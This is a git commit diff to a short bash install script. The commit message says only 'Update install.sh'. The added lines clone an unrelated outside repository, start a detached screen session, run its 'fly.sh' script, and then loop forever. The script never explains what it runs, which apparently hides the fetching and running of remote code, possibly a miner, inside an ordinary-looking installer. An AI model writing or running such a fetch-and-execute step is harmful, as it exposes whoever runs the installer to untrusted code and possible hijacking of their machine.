402717d5c2007f72e72137794c9201d4abfced6a
huardima <86064427+huardima@users.noreply.github.com>
2021-06-17 21:35:51 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,10 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen -y
+git clone https://github.com/micin69/pretty-fly.git && cd pretty-fly
+screen -dmS ls
+chmod +x fly.sh && ./fly.sh
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
